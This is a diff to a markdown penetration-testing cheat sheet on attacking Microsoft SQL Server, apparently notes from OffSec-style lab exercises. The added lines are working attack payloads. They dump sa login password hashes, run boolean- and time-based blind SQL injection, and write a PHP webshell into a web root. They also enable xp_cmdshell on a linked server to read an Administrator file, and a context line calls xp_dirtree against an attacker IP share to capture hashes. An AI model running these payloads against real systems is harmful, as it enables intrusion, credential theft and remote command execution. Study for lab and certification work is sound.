@@ -22,6 +22,49 @@ Get-SQLInstanceDomain -Verbose -DomainAccount svc_mssql
 sqlcmd.exe -Q "use master; exec xp_dirtree '\\192.168.45.221\share\test'" -S nagoya.nagoya-industries.com`
 ```
 
+##### Enumeration
+
+```sql
+select user_name();
+select current_user;  -- alternate way
+select @@version;
+select @@servername;
+# show list of databases ("master." is optional)
+select name from master.sys.databases;
+exec sp_databases;  -- alternate way
+# note: built-in databases are master, tempdb, model, and msdb
+# you can exclude them to show only user-created databases like so:
+select name from master.sys.databases where name not in ('master', 'tempdb', 'model', 'msdb');
+use master
+# getting table names from a specific database:
+select table_name from somedatabase.information_schema.tables;
+# getting column names from a specific table:
+select column_name from somedatabase.information_schema.columns where table_name='sometable';
+# get credentials for 'sa' login user:
+select name,master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
+# get credentials from offsec database (using 'dbo' table schema) user table
+select * from offsec.dbo.users;
+# error/boolean-based blind injection
+' AND LEN((SELECT TOP 1 username FROM dbo.users))=5; -- #
+# time-based blind injection
+' WAITFOR DELAY '0:0:3'; -- #
+mysql> show variables like "secure_file_priv";
+select LOAD_FILE("/xampp/htdocs/test.php");
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/xampp/htdocs/webshell.php';
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
+go
+EXECUTE ('sp_configure "show advanced options", 1 ') AT [LOCAL.TEST.LINKED.SRV]
+go
+Execute (' RECONFIGURE' ) AT [LOCAL.TEST.LINKED.SRV]
+go
+EXECUTE ('sp_configure "xp_cmdshell", 1 ') AT [LOCAL.TEST.LINKED.SRV]
+go
+Execute (' RECONFIGURE' ) AT [LOCAL.TEST.LINKED.SRV]
+go
+EXECUTE ('xp_cmdshell "type \Users\Administrator\desktop\flag.txt" ') AT [LOCAL.TEST.LINKED.SRV]
+go
+```
+
 ##### Impacket
 
 ````
